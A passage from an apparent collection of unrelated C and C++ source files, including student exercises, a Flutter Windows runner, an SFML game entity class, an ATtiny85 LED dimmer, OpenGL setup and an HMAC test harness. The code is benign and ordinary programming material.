return 0;\n        }\n\n        auto it = elementos.find({ fila, columna });\n        return (it != elementos.end()) ? it->second : 0; // DEVUELVE UN 0 SI NO EST\u00c1 EN EL MAPA.\n    }\n\n    // MOSTRAR LA MATRIZ COMPLETA...\n\n    void show() const\n    {\n        for (int i = 0; i < filas; i++)\n        {\n            for (int j = 0; j < columnas; j++)\n            {\n                cout << get(i, j) << \" \";\n            }\n\n            cout << endl;\n        }\n    }\n};\n\nint main()\n{\n    matrizDispersa matrix(5, 5);\n\n    // ASIGNA ALGUNOS VALORES A LA MATRIZ...\n\n    matrix.asignarValor(0, 1, 5);\n    matrix.asignarValor(3, 2, 10);\n    matrix.asignarValor(4, 4, 15);\n\n    // MUESTRA LA MATRIZ...\n\n    cout << \" MATRIZ DISPERSA COMPLETA: \" << endl;\n    matrix.show();\n\n    // OBTENER UN VALOR ESPEC\u00cdFICO...\n\n    cout << \" VALOR EN (3, 2): \" << matrix.get(3, 2) << endl;\n\n    // CAMBIAR EL VALOR A 0...\n\n    matrix.asignarValor(3, 2, 0);\n\n    // MOSTRAR NUEVAMENTE LA MATRIZ...\n\n    cout << \" MATRIZ DESPU\u00c9S DE ASIGNAR 0 EN (3, 2): \" << endl;\n    matrix.show();\n\n    return 0;\n}\n\n\n",
    "///////////////////////////////////////////////////////////////////////\n// This file is part of the PySYCL software for SYCL development in\n// Python. It is licensed under the Apache License, Version 2.0. A copy\n// of this license, in a file named LICENSE.md, should have been\n// distributed with this file. A copy of this license is also\n// currently available at \"http://www.apache.org/licenses/LICENSE-2.0\".\n\n// Unless explicitly stated, all contributions intentionally submitted\n// to this project shall also be under the terms and conditions of this\n// license, without any additional terms or conditions.\n///////////////////////////////////////////////////////////////////////\n\n///////////////////////////////////////////////////////////////////////\n/// \\file\n/// \\brief Google test suite for PySYCL\n///////////////////////////////////////////////////////////////////////\n\n///////////////////////////////////////////////////////////////////////\n// gtest\n///////////////////////////////////////////////////////////////////////\n#include <gtest/gtest.h>\n\n///////////////////////////////////////////////////////////////////////\n// stl\n///////////////////////////////////////////////////////////////////////\n#include <iostream>\n\nint main(int argc, char* argv[]) {\n  // initialize google test\n  ::testing::InitGoogleTest(&argc, argv);\n\n  std::cout << \"RUNNING ALL UNIT TESTS\" << std::endl;\n\n  int result = RUN_ALL_TESTS();\n\n  return result;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nint maxNum(int array[], int count)\r\n{\r\n\r\n    int max = array[0];\r\n\r\n    for (int i = 0; i < count; i++)\r\n    {\r\n        if (array[i] >= max)\r\n        {\r\n            max = array[i];\r\n        }\r\n    }\r\n\r\n    return max;\r\n}\r\nint minNum(int array[], int count)\r\n{\r\n    int min = array[0];\r\n\r\n    for (int i = 0; i < count; i++)\r\n    {\r\n        if (array[i] <= min)\r\n        {\r\n            min = array[i];\r\n        }\r\n    }\r\n    return min;\r\n}\r\nint num_of_Prime(int array[], int count)\r\n{\r\n\r\n    int count_Prime = 0;\r\n\r\n    for (int i = 0; i < count; i++)\r\n    {\r\n        bool booll = true;\r\n\r\n        if (array[i] <= 1)\r\n            continue;\r\n\r\n        for (int j = 2; j <= array[i] / 2; j++)\r\n        {\r\n\r\n            if (array[i] % j == 0)\r\n            {\r\n                booll = false;\r\n                break;\r\n            }\r\n        }\r\n        if (booll == true)\r\n        {\r\n            count_Prime++;\r\n        }\r\n    }\r\n\r\n    return count_Prime;\r\n}\r\n\r\nint num_of_Palindrome(int array[], int count)\r\n{\r\n\r\n    int count_Palindrome = 0;\r\n\r\n    for (int i = 0; i < count; i++)\r\n    {\r\n        int Rev_num = 0;\r\n        int temp = array[i];\r\n        while (temp > 0)\r\n        {\r\n\r\n            Rev_num = Rev_num * 10 + (temp % 10);\r\n            temp = temp / 10;\r\n        }\r\n\r\n        if (array[i] == Rev_num)\r\n        {\r\n            count_Palindrome++;\r\n        }\r\n    }\r\n\r\n    return count_Palindrome;\r\n}\r\n\r\nint num_Denominators(int array[], int count)\r\n{\r\n\r\n    int ArrayNumDen[count];\r\n\r\n    for (int i = 0; i < count; i++)\r\n    {\r\n        int count_Denominators = 0;\r\n        for (int j = 1; j <= array[i] / 2; j++)\r\n        {\r\n            if (array[i] % j == 0)\r\n            {\r\n                count_Denominators++;\r\n            }\r\n        }\r\n\r\n        ArrayNumDen[i] = count_Denominators;\r\n    }\r\n\r\n    int max = ArrayNumDen[0];\r\n    int NumMaxDen = array[0];\r\n\r\n    for (int i = 0; i < count; i++)\r\n    {\r\n        if (ArrayNumDen[i] > max)\r\n        {\r\n            max = ArrayNumDen[i];\r\n            NumMaxDen = array[i];\r\n        }\r\n\r\n        else if (ArrayNumDen [i] == max)\r\n        {\r\n            if (array[i] > NumMaxDen)\r\n            {\r\n                NumMaxDen = array[i];\r\n            }\r\n            \r\n        }\r\n        \r\n    }\r\n    return NumMaxDen;\r\n}\r\n\r\nint main()\r\n{\r\n\r\nint n;\r\ncin>>n;\r\nint array[n];\r\nfor (int i = 0; i < n; i++)\r\n{\r\n    cin>>array[i];\r\n}\r\n\r\ncout<<\"The maximum number : \"<<maxNum(array,n)<<endl;\r\ncout<<\"The minimum number : \"<<minNum(array,n)<<endl;\r\ncout<<\"The number of prime numbers : \"<<num_of_Prime(array,n)<<endl;\r\ncout<<\"The number of palindrome numbers : \"<<num_of_Palindrome(array,n)<<endl;\r\ncout<<\"The number that has the maximum number of divisors : \"<<num_Denominators(array,n)<<endl;\r\n\r\n\r\n}",
    "#include <iostream>\n\nusing namespace std;\n\nint ingresarnumero(){\n\n    int numeroIngresado;\n\n    cin >> numeroIngresado;\n\nreturn numeroIngresado;\n}\n\nvoid FizzBuzz(){\n\n     int numero = ingresarnumero();\n     int multiploTres, multiploCinco;\n\n    if ( numero >= 15){\n\n         for(int i = 1; i <= numero ; ++i){\n\n            multiploTres = i % 3;\n            multiploCinco = i % 5;\n\n         if (multiploTres == 0 && multiploCinco == 0){\n\n            cout << \"FizzBuzz\" << endl;\n\n         }else if(multiploCinco == 0 && multiploTres != 0){\n\n            cout << \"Buzz\" << endl;\n\n         }else if( multiploCinco != 0 && multiploTres == 0){\n\n             cout << \"Fizz\" << endl;\n\n         }else{\n\n             cout << i << endl;\n         }\n\n}\n    }else{\n        cout << \"El numero es menor a 15\" << endl << endl;\n}\n\n}\n\nvoid numeroCapicua(){\n\n    int numero = ingresarnumero();\n    int numeroOriginal = numero;\n    int numeroInverso = 0;\n\n\n\n    while( numeroOriginal > 0){\n    numeroInverso = (numeroInverso * 10) + (numeroOriginal % 10);\n\n    numeroOriginal/=10;\n    }\n\n    if (numeroInverso == numero){\n        cout << \"Es un numero capicua \" << endl;\n    }else{\n        cout << \"No es un numero capicua \" << endl;\n    }\n\n\n}\n\nvoid numerosPrimos(){\n\n     int numero = ingresarnumero();\n     int esPrimo= 0;\n\n\n     if ( numero <= 1 ){\n        cout << \"No es un numero primo \" << endl;\n }\n\n     for (int i = 1; i <= numero ; ++i){\n     if ( numero % i == 0){\n        esPrimo++;\n\n  }\n }\n\n     if (esPrimo == 2){\n        cout << \"Es primo\" << endl;\n     }else{\n     cout << \"No es primo\" << endl;\n }\n\n}\n\nint main(){\n\n\n    int opcion;\n\n    do {\n\n        cout << \"1.FizzBuzz\" << endl;\n        cout << \"2.Numero Capicua\" << endl;\n        cout << \"3.Numero primo\" << endl;\n        cout << \"4.Salir\" << endl;;\n        cin >> opcion;\n\n    switch(opcion){\n\n    case 1:\n        cout << \"Ingrese un numero mayor a 15: \" ;\n        FizzBuzz();\n        break;\n\n    case 2:\n        cout << \"Ingrese un numero entero: \";\n        numeroCapicua();\n        break;\n\n    case 3:\n        cout << \"Ingrese un numero entero: \" << endl;\n        numerosPrimos();\n        break;\n\n    case 4:\n            cout << \" Saliendo del programa..... \" << endl;\n        break;\n\n    default:\n            cout << \" Numero ingresado no valido \" << endl;\n        break;\n\n\n\n\n}\n\n} while( opcion !=4 );\nreturn 0;\n}\n",
    "#include<stdio.h>\r\nvoid menu (); // I define prototypes here\r\nint min(int, int, int); // I tried first with two values then changed into 3 values\r\nint max(int,int, int);\r\nint square(int);\r\nint cube(int);\r\nint absolute(int);\r\nint half(int);\r\nint factorial(int);\r\n\r\n\r\nint main () {\r\n\tint choose=0,x,y,z;\r\n\tmenu();\r\n\tprintf(\"Choose a number between 1 and 7: \");\r\n\tscanf(\"%d\", &choose);\r\n\tprintf(\"\\n\\n\");\r\n\tswitch(choose) {\t// Switch case was easier to create and define what should be done step by step\r\n\t\t\r\n\t\tcase 1: printf(\"Enter three numbers:\");\t//Choose 3 values to make a bit difficult\r\n\t\t\t\tscanf(\"%d%d%d\", &x, &y, &z);\t\r\n\t\t\t\tprintf(\"Min:%d\\n\", min(x,y,z));\r\n\t\tbreak; \r\n\t\tcase 2: printf(\"Enter three numbers:\");\r\n\t\t\t\tscanf(\"%d%d%d\", &x, &y, &z);\r\n\t\t\t\tprintf(\"Max:%d\\n\", max(x,y,z));\r\n\t\tbreak;\r\n\t\tcase 3:printf(\"Enter a number:\");\r\n\t\t\t\tscanf(\"%d\", &x);\r\n\t\t\t\tprintf(\"square:%d\\n\", square(x));\r\n\t\tbreak;\r\n\t\tcase 4:printf(\"Enter a number:\");\r\n\t\t\t\tscanf(\"%d\", &x);\r\n\t\t\t\tprintf(\"cube:%d\\n\", cube(x));\r\n\t\tbreak;\r\n\t\tcase 5:printf(\"Enter a number:\");\r\n\t\t\t\tscanf(\"%d\", &x);\r\n\t\t\t\tprintf(\"Absolute value:%d\\n\", absolute(x));\r\n\t\tbreak;\r\n\t\tcase 6:printf(\"Enter a number:\");\r\n\t\t\t\tscanf(\"%d\", &x);\r\n\t\t\t\tprintf(\"1/2 value:%d\\n\", half(x));\r\n\t\tbreak;\r\n\t\tcase 7:printf(\"Enter a number:\");\r\n\t\t\t\tscanf(\"%d\", &x);\r\n\t\t\t\tprintf(\"Factorial:%d\\n\", factorial(x));\r\n\t\tbreak;\r\n\t\tdefault:printf(\"You choose an invalid value\");\r\n\t\r\n\t}\r\n\t\r\n\treturn 0;\r\n}\r\n\r\nvoid menu () {\r\n\tprintf(\"\\n\");\r\n\tprintf(\"***************\\n\");\r\n\tprintf(\"---------------\\n\");\r\n\tprintf(\"******MENU*****\\n\");\r\n\tprintf(\"---------------\\n\\n\");\r\n\tprintf(\"1-Min\\n\");\r\n\tprintf(\"2-Max\\n\");\r\n\tprintf(\"3-Square\\n\");\r\n\tprintf(\"4-cube\\n\");\r\n\tprintf(\"5-absolute value\\n\");\r\n\tprintf(\"6-half of number\\n\");\r\n\tprintf(\"7-factorial\\n\");\t\t\t\r\n\r\n\r\n}\r\nint min (int x, int y, int z){\r\n\r\nif(x<y && x<z) { // AND value to make smaller steps\r\n\treturn x;\r\n}else if(y<x && y<z){\r\n\treturn y;\r\n}else(z<x && z<y);{\r\n\treturn z;\r\n} \r\n}\r\nint max (int x, int y, int z){\r\n\r\nif(x>y && x>z) { // AND value to make smaller steps\r\n\treturn x;\r\n}else if(y>x && y>z){\r\n\treturn y;\r\n}else(z>x && z>y);{\r\n\treturn z;\r\n}\r\n}\r\nint square (int x){ // with return the problems would be easier calculated by cube and square\r\n\r\nreturn x*x;\r\n}\r\n\r\nint cube (int x) {\r\n\treturn x*x*x;\t\r\n}\r\nint absolute(int x) { \r\n\tif(x<0) {\r\n\t\treturn x*(-1); // because |-x| value we need to calculate nagative values with -1\t\r\n\t}else {\r\n\t\treturn x; // positive value remains the same\r\n\t}\r\n}\r\nint half (int x) { // half of value would be calculated\r\n\treturn x/2;\t\r\n}\r\nint factorial (int x) { \r\n\tif( x == 0) // the factorial calculation of 0 is 1\r\n\treturn 1;\r\n\telse\r\n\treturn x*factorial(x-1);\t\r\n}\r\n\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"on_boarding\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<string>\n#include<SFML/Graphics.hpp>\n#include\"Model.hpp\"\n\nEntity::Entity()\n{\n    id=-1;\n    curr_health=max_health=100;\n    position=sf::Vector2f(0,0);\n    bulk=sf::Vector2f(0,0);\n    entity_state=IDLE;\n    model=nullptr;\n    texture=\"dumb.jpg\";\n    sight=0;\n    moveable=new No_move();\n    entity_factory = new False_entity_factory();\n    strategy = new No_strategy();\n    skill = new No_skill();\n}\n\nEntity::Entity(int faction,Entity_type et,std::string t,sf::Vector2f p,sf::Vector2f b)\n{\n    this->faction=faction;\n    curr_health=max_health=10000;\n    entity_type=et;\n    texture=t;\n    position=p;\n    bulk=b;\n    entity_state=IDLE;\n    sight=0;\n    moveable=new No_move();\n    entity_factory = new False_entity_factory();\n    strategy = new No_strategy();\n    skill = new No_skill();\n}\n\nEntity::Entity(int faction,Entity_type et,std::string t,sf::Vector2f p,sf::Vector2f b,int max_h,float si,Moveable* m,Entity_factory* f,Strategy* s,Skill* sk)\n{\n    this->faction=faction;\n    entity_type=et;\n    texture=t;\n    position=p;\n    bulk=b;\n    curr_health=max_health=max_h;\n    sight=si;\n    entity_state=IDLE;\n    moveable=m;\n    entity_factory=f;\n    strategy=s;\n    skill=sk;\n}\n\nEntity::Entity(const Entity& e)\n{\n    faction=e.faction;\n    id=e.id;\n    entity_type=e.entity_type;\n    texture=e.texture;\n    position=e.position;\n    bulk=e.bulk;\n    max_health=e.max_health;\n    curr_health=e.curr_health;\n    sight=e.sight;\n    entity_state=e.entity_state;\n    model=e.model;\n    moveable=e.moveable->clone();\n    entity_factory=e.entity_factory->clone();\n    strategy=e.strategy->clone();\n    skill=e.skill->clone();\n}\n\nEntity::~Entity()\n{\n    delete moveable;\n    delete entity_factory;\n    delete strategy;\n    delete skill;\n}\n\nvoid Entity::operator=(Entity& e)\n{\n    faction=e.faction;\n    id=e.id;\n    entity_type=e.entity_type;\n    texture=e.texture;\n    position=e.position;\n    bulk=e.bulk;\n    max_health=e.max_health;\n    curr_health=e.curr_health;\n    sight=e.sight;\n    entity_state=e.entity_state;\n    model=e.model;\n    moveable=e.moveable->clone();\n    entity_factory=e.entity_factory->clone();\n    strategy=e.strategy->clone();\n    skill =e.skill->clone();\n}\n\nvoid Entity::set_id(int i)\n{\n    id=i;\n}\n\nvoid Entity::act()\n{\n    strategy->control(this);\n}\n\nstd::vector<Entity*> Entity::look_around()\n{\n    return model->entity_in_sight(position,sight);\n}\n\nsf::Vector2f Entity::enemy_base_position()\n{\n    int enemy_base_id;\n    for(auto [f,id]:model->base_faction_id)\n    {\n        if(f!=this->faction&&f!=0)\n        {\n            enemy_base_id=model->base_faction_id[f];\n        }\n    }\n    return model->entities[enemy_base_id]->position;\n}\n\nEntity_type Entity::str2entity_type(std::string str)\n{\n    if (str == \"UNIT\") {\n        return UNIT;\n    } else if (str == \"BUILDING\") {\n        return BUILDING;\n    } else if (str == \"MOUNTAIN\") {\n        return MOUNTAIN;\n    } else if(str == \"RIVER\")\n    {\n        return RIVER;\n    }\n    else {\n        throw std::runtime_error(\"Invalid Entity_type string: \" + str);\n    }\n}\n\nEntity* Entity::create_from_json(json entity_json)\n{\n    int entity_faction=entity_json[\"faction\"];\n    Entity_type entity_type=Entity::str2entity_type(entity_json[\"entity_type\"]);\n    sf::Vector2f position=sf::Vector2f(entity_json[\"position\"][0],entity_json[\"position\"][1]);\n    sf::Vector2f bulk=sf::Vector2f(entity_json[\"bulk\"][0],entity_json[\"bulk\"][1]);\n    std::string texture=entity_json[\"texture\"];\n    if(entity_type==MOUNTAIN)\n        return new Entity(entity_faction,entity_type,texture,position,bulk);\n    int max_health=entity_json[\"max_health\"];\n    float sight=entity_json[\"sight\"];\n    Moveable* moveable=Moveable::create_from_json(entity_json[\"moveable\"]);\n    Entity_factory* entity_factory=Entity_factory::create_from_json(entity_json[\"entity_factory\"]);\n    Strategy* strategy=Strategy::create_from_json(entity_json[\"strategy\"]);\n    Skill* skill=Skill::create_from_json(entity_json[\"skill\"]);\n    Entity* new_entity =new Entity(entity_faction,entity_type,texture,position,bulk,max_health,sight,moveable,entity_factory,strategy,skill);\n    return new_entity;\n}\n\n\n",
    "/*\n * Program: LED Lighting Controller\n * Author: Thorsten Schnebeck\n * Date: 2024-12-30\n * \n * Description:\n * This program controls an LED lighting unit with independently adjustable cold and warm white LED strings \n * using PWM signals generated by an ATtiny85 microcontroller, utilizing commands from an IR remote control. \n * It provides functionality to smoothly transition between colors (cold white and warm white), read and store \n * color settings in EEPROM, and adjust brightness levels. The program utilizes Timer1 for PWM signal generation \n * and includes routines for setting PWM values, performing smooth fades between colors, and saving/retrieving settings.\n * \n * Key Features:\n * - Reading IR remote control commands (NEC format).\n * - PWM control for dual LED channels (cold white and warm white).\n * - Adjustable brightness and color transitions with specified durations.\n * - Persistent storage of color settings in EEPROM.\n * - Optimized for minimal resource usage on the ATtiny85.\n * \n * Hardware Requirements:\n * - ATtiny85 microcontroller (8 MHz clock).\n * - LED strings controlled via PB1 and PB4 PWM outputs.\n * - NEC format IR remote control.\n * \n * Note:\n * This program is designed for embedded systems with limited resources and does not rely on a serial monitor \n * for debugging or user interaction. Additionally, while the main development was done on a Digispark ATtiny85 \n * board, the microcontroller was programmed using an ISP programmer rather than a bootloader.\n */\n\n#define IRMP_SUPPORT_NEC_PROTOCOL 1 \n#define IR_RECEIVE_PIN 2 // PB2 on ATtiny85\n#define ARDUINO_AVR_DIGISPARK 1\n\n#include <Arduino.h>\n#include <EEPROM.h>\n#include <irmp.hpp>\n#include <avr/io.h>\n#include <avr/wdt.h>\n\nconst unsigned long RESET_TIMEOUT_S = 2;            // brownout detection time horizont\nconst unsigned long LIGHTOFF_TIMEOUT_S = 1800;      // 30min lights-off time-out\nconst int EEPROM_COLD_WHITE_ADDR = 0;\nconst int EEPROM_WARM_WHITE_ADDR = 1;\nconst uint8_t MAGIC_VALUE = 0XAB; // magic value in SRAM  \n\nvolatile unsigned long timeCounter = 0;\nvolatile uint8_t resetMarker __attribute__((section(\".noinit\"))); // SRAM reset marker\nunsigned long restartDetectTimer = 0; \nunsigned long lightOffTimer = 0; \nuint8_t current_preset = 0;\nbool is_on = true;\nbool is_night = false;\nbool timer_start = false;\n\nIRMP_DATA irmp_data;\n\nstruct PWMdata {\n    uint8_t coldWhite;\n    uint8_t warmWhite;\n};\n\nstruct PWMdata whiteColor = {128, 128};\nuint8_t brightness = 128;\n\nconst uint8_t presets[5][2] = {\n    {255, 1},   // Preset 0\n    {255, 128}, // Preset 1\n    {255, 255}, // Preset 2\n    {128, 255}, // Preset 3\n    {1, 255}    // Preset 4\n};\n\n\n// Declaration of functions\nvoid mdelay(uint16_t time);\nstruct PWMdata setBrightness(uint8_t brightness,  struct PWMdata white);\nvoid fadePWM(struct PWMdata start, struct PWMdata stop, int16_t durationMs = 800);\nvoid setupPWM();\nvoid setPWM(struct PWMdata white);\nvoid processNECCommand(uint16_t command);\nstruct PWMdata readColor();\nuint8_t getBrightness(struct PWMdata color);    \n\n\nvoid mdelay(uint16_t time) {\n    for (uint16_t j = 1; j<time; j++) {\n        // delay loop for approx. 1ms @ 8Mhz \n        for (uint16_t i = 0; i < 700; i++) {\n            __asm__ __volatile__ (\n                \"nop\\n\\t\"\n                \"nop\\n\\t\"\n                \"nop\\n\\t\" \n                \"nop\\n\\t\" \n                \"nop\\n\\t\" \n                \"nop\\n\\t\" \n                \"nop\\n\\t\" \n                \"nop\\n\\t\" \n            );    \n        }\n    }\n}\n\nstruct PWMdata setBrightness(uint8_t brightness, struct PWMdata white) {\n    uint16_t newColdWhitePWM;\n    uint16_t newWarmWhitePWM;\n\n    // increase integer mathematics accuracy by using scaling\n    const uint16_t scaleFactor = 100;\n\n    if (white.coldWhite >= white.warmWhite) {\n        newColdWhitePWM = brightness;\n        // add 9/10th of the divisor to the divident for better rounding results\n        uint16_t temp = (uint16_t(white.coldWhite) * scaleFactor + ((uint16_t(white.warmWhite) * 9) / 10)) / uint16_t(white.warmWhite);\n        newWarmWhitePWM = (brightness * scaleFactor + ((temp * 9) / 10)) / temp;\n\n    } else {\n        newWarmWhitePWM = brightness;\n        // add 9/10th of the divisor to the divident for better rounding results\n        uint16_t temp = (uint16_t(white.warmWhite) * scaleFactor + ((uint16_t(white.coldWhite) * 9) / 10)) / uint16_t(white.coldWhite);\n        newColdWhitePWM = (brightness * scaleFactor + ((temp * 9) / 10)) / temp;\n    }\n    // check valid parameter range (1-255)\n    return {uint8_t(constrain(newColdWhitePWM, 1, 255)), uint8_t(constrain(newWarmWhitePWM, 1, 255))};\n}\n\nvoid fadePWM(struct PWMdata start, struct PWMdata stop, int16_t durationMs) {\n    // Anzahl der Schritte (z. B. 50 Schritte f\u00fcr sanftes Fading)\n    const int16_t steps = 50;\n    // single step duration in milliseconds\n    int16_t stepDelay = durationMs / steps;\n\n    // step size per channel\n    int16_t stepCold = (int16_t(stop.coldWhite) - int16_t(start.coldWhite)) / steps;\n    int1",
    "#include \"Opengl_Utils.h\"\n#include <iostream>\n\nGLFWwindow* InitializeOpenGL(int width, int height, const char* title) {\n    // \u521d\u59cb\u5316 GLFW\n    if (!glfwInit()) {\n        std::cerr << \"Failed to initialize GLFW\" << std::endl;\n        return nullptr;\n    }\n\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE); // MacOS \u9700\u8981\u6b64\u914d\u7f6e\n#endif\n\n    // \u521b\u5efa\u7a97\u53e3\n    GLFWwindow* window = glfwCreateWindow(width, height, title, nullptr, nullptr);\n    if (!window) {\n        std::cerr << \"Failed to create GLFW window\" << std::endl;\n        glfwTerminate();\n        return nullptr;\n    }\n    glfwMakeContextCurrent(window);\n\n    // \u521d\u59cb\u5316 GLAD\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress)) {\n        std::cerr << \"Failed to initialize GLAD\" << std::endl;\n        glfwDestroyWindow(window);\n        glfwTerminate();\n        return nullptr;\n    }\n\n    // \u8bbe\u7f6e\u89c6\u53e3\u548c\u56de\u8c03\n    glViewport(0, 0, width, height);\n    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);\n\n    return window;\n}\n\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height) {\n    glViewport(0, 0, width, height);\n}\n",
    "#include <iostream>\n#include <vector>\n#include <cstdint>\n#include <random>\n#include <algorithm>\n\n#include <openssl/hmac.h>\n\n#include \"HMAC.h\"\n\nconst uint8_t ZERO = 0x00;\nconst uint8_t MAX_BYTE = 0xFF;\nconst int MAX_LEN = 1024;\n\nbool testHMAC(const std::vector<uint8_t> &key, const std::vector<uint8_t> &message, const std::vector<uint8_t> &got, const EVP_MD *md, size_t outputSize)\n{\n        std::vector<uint8_t> expected(outputSize);\n\n        unsigned char *expectedPtr = HMAC(md, key.data(), key.size(), message.data(), message.size(), NULL, NULL);\n        std::copy(expectedPtr, expectedPtr + outputSize, expected.begin());\n\n        return std::equal(expected.begin(), expected.end(), got.begin());\n}\n\nstd::vector<uint8_t> genRandomBytes(int minLen, int maxLen, int n)\n{\n        std::vector<uint8_t> bytes(n);\n\n        std::random_device rd;\n        std::mt19937 gen(rd());\n        std::uniform_int_distribution<> dis(minLen, maxLen);\n\n        for (int i = 0; i < n; i++)\n        {\n                bytes[i] = dis(gen);\n        }\n\n        return bytes;\n}\n\nvoid testRandomPairs(int n, unsigned char *(*hashFunc)(const unsigned char *, size_t, unsigned char *nullPass), const EVP_MD *md, size_t blockSize, size_t outputSize)\n{\n        bool verbose = false;\n        std::cout << \"Print verbose output? (Y/n): \";\n        char c;\n        std::cin >> c;\n        if (c == 'Y' || c == 'y')\n        {\n                verbose = true;\n        }\n\n        int passed = 0;\n        for (int i = 0; i < n; i++)\n        {\n                std::vector<uint8_t> key = genRandomBytes(ZERO, MAX_BYTE, MAX_LEN);\n                std::vector<uint8_t> message = genRandomBytes(ZERO, MAX_BYTE, MAX_LEN);\n                std::vector<uint8_t> got = My::hmac(key, message, hashFunc, blockSize, outputSize);\n\n                if (verbose)\n                {\n                        std::cout << std::dec;\n                        std::cout << \"TEST \" << i + 1 << \"/\" << n << \"\\n\";\n                        std::cout << \"Key:\\n\";\n                        for (uint8_t byte : key)\n                        {\n                                std::cout << std::hex << (int)byte;\n                        }\n                        std::cout << \"\\n\";\n                        std::cout << \"Message:\\n\";\n                        for (uint8_t byte : message)\n                        {\n                                std::cout << std::hex << (int)byte;\n                        }\n                        std::cout << \"\\n\";\n                        bool pass = testHMAC(key, message, got, md, outputSize);\n                        if (pass)\n                        {\n                                std::cout << \"PASS\\n\";\n                                passed++;\n                        }\n                        else\n                        {\n                                std::cout << \"FAIL\\n\";\n                        }\n                        std::cout << \"\\n\";\n                }\n                else\n                {\n                        std::cout << \"TEST \" << i + 1 << \"/\" << n << \" \";\n                        bool pass = testHMAC(key, message, got, md, outputSize);\n                        if (pass)\n                        {\n                                std::cout << \"PASS\\n\";\n                                passed++;\n                        }\n                        else\n                        {\n                                std::cout << \"FAIL\\n\";\n                        }\n                }\n        }\n        std::cout << std::dec;\n        std::cout << \"\\nPassed \" << passed << \"/\" << n << \" tests\\n\";\n}\n\n",
    "#include<bits/stdc++.h>\r\n#include \"FeEGELib.h\"\r\nusing namespace std;\r\nusing namespace FeEGE;\r\n\r\nchar s[1025];\r\n\r\nint main(){\r\n\tsetcaption(\"\u8ba1\u65f6\u5668\");\r\n\tinitgraph(600,400);\r\n\tinitpen();\r\n\tpen::font(80,\"\u5e7c\u5706\");\r\n\t\r\n\tauto trans = [&](const string& raw){\r\n\t\tif(raw.length() <= 1) return \"0\" + raw;\r\n\t\treturn raw;\r\n\t};\r\n\t\r\n\tfunction<void(int)> func;\r\n\tfunction<void(void)> F;\r\n\tfunc = [&](int rest){\r\n\t\tpen::clear_all();\r\n\t\tif(rest == -1){\r\n\t\t\tstring str = \"\u65f6\u95f4\u5230\";\r\n\t\t\tint w = textwidth(str.c_str(),pen_image);\r\n\t\t\tint h = textheight(str.c_str(),pen_image);\r\n\t\t\tpen::print(((X - w) >> 1),((Y - h - 100) >> 1),str);\r\n\t\t\t\r\n\t\t\tpen::font(30,\"\u5e7c\u5706\");\r\n\t\t\tstr = \"\u70b9\u51fb\u4efb\u610f\u4f4d\u7f6e\u91cd\u542f\";\r\n\t\t\tw = textwidth(str.c_str(),pen_image);\r\n\t\t\th = textheight(str.c_str(),pen_image);\r\n\t\t\tpen::print(((X - w) >> 1),((Y + 100 - h) >> 1),str);\r\n\t\t\treflush();\r\n\t\t\t\r\n\t\t\tglobalListen(EventType.frame,\"click\",[=](){\r\n\t\t\t\tif(!getkey(LeftButton)) return;\r\n\t\t\t\tpush_schedule([=,&F](){\r\n\t\t\t\t\tF();\r\n\t\t\t\t\tstopGlobalListen(EventType.frame,\"click\");\r\n\t\t\t\t});\r\n\t\t\t});\r\n\t\t\t\r\n\t\t\treturn;\r\n\t\t}\r\n\t\tstring str = trans(to_string(rest / 60)) + \" : \" + trans(to_string(rest % 60));\r\n\t\tint w = textwidth(str.c_str(),pen_image);\r\n\t\tint h = textheight(str.c_str(),pen_image);\r\n\t\tpen::print(((X - w) >> 1),((Y - h) >> 1),str);\r\n\t\tsetTimeOut([=,&func](){\r\n\t\t\tfunc(rest - 1);\r\n\t\t},1000);\r\n\t};\r\n\t\r\n\tF = [&](){\r\n\t\tdelay_ms(100);\r\n\t\tpen::font(80,\"\u5e7c\u5706\");\r\n\t\tinputbox_getline(\"\u8f93\u5165\u65f6\u957f\",\r\n\t                    \"\u4ee5\u79d2\u4e3a\u5355\u4f4d\",\r\n\t                    s,\r\n\t                    sizeof(s)/sizeof(*s));\r\n\t    \r\n\t    int times = -1;\r\n\t\tsscanf(s,\"%d\",&times);\r\n\t\t\r\n\t\tfunc(times);\r\n\t};\r\n\t\r\n\tF();\r\n\t\r\n\tstart();\r\n\treturn 0;\r\n}\r\n",
